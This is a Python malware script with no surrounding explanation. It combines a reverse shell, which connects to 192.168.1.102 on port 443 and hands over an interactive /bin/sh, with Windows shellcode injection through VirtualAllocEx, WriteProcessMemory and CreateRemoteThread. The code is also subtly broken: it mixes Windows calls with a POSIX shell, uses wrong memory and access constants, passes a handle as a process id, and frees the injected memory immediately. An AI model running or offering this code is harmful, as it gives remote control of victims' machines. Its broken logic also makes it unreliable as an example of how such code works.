import ctypes
from ctypes import wintypes
import socket
import subprocess
import os

def reverse_shell():
    # Define the socket parameters
    ADDR = "192.168.1.102"
    PORT = 443
    # Create a new socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connect to the remote host
        s.connect((ADDR, PORT))
        # Create a new process
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        # Execute the shell
        proc = subprocess.Popen(["/bin/sh", "-i"])
        # Wait for the process to exit
        proc.wait()
    except Exception as e:
        print(f"Error in reverse shell: {e}")
    finally:
        # Close the socket
        s.close()
    return 0

def write_to_memory(process_id, buffer, buffer_size):
    MEM_RESERVE = 0x1000
    MEM_COMMIT = 0x00001000
    PAGE_READWRITE = 0x04
    kernel32 = ctypes.windll.kernel32
    processHandle = kernel32.OpenProcess(MEM_RESERVE | MEM_COMMIT, False, process_id)
    if not processHandle:
        print(f"Failed to open process. Error code: {kernel32.GetLastError()}")
        return

    address = kernel32.VirtualAllocEx(processHandle, 0, buffer_size, MEM_RESERVE, PAGE_READWRITE)
    if not address:
        print(f"Failed to allocate memory. Error code: {kernel32.GetLastError()}")
        kernel32.CloseHandle(processHandle)
        return

    written = ctypes.c_ulong(0)
    if not kernel32.WriteProcessMemory(processHandle, address, buffer, buffer_size, ctypes.byref(written)):
        print(f"Failed to write to process memory. Error code: {kernel32.GetLastError()}")
        kernel32.CloseHandle(processHandle)
        return

    # Finally, start a new thread to execute our payload
    thread_handle = kernel32.CreateRemoteThread(processHandle, None, 0, address, 0, 0, None)
    if not thread_handle:
        print(f"Failed to create remote thread. Error code: {kernel32.GetLastError()}")

    # Free the allocated memory
    kernel32.VirtualFreeEx(processHandle, address, 0, kernel32.MEM_RELEASE)
    kernel32.CloseHandle(processHandle)

def main():
    # Open the current process
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    GetCurrentProcess = kernel32.GetCurrentProcess
    GetCurrentProcess.restype = wintypes.HANDLE
    processHandle = GetCurrentProcess()

    # Allocate some memory in the current process
    buffer_size = 1500
    MEM_RESERVE = 0x1000
    MEM_COMMIT = 0x00001000
    PAGE_READWRITE = 0x04
    address = kernel32.VirtualAllocEx(processHandle, 0, buffer_size, MEM_RESERVE, PAGE_READWRITE)

    # Write our shellcode into the memory we allocated
    shellcode = bytearray([
        0x33, 0xC0, 0x50, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x50, 0x54, 0x68, 0x78, 0x47, 0x8E,
        0x0E, 0xE8, 0xE9, 0xFF, 0xFF, 0xFF
    ])

    write_to_memory(processHandle, shellcode, buffer_size)

    # After injecting the shellcode, execute the reverse shell
    reverse_shell()

    return 0

if __name__ == '__main__':
    main()
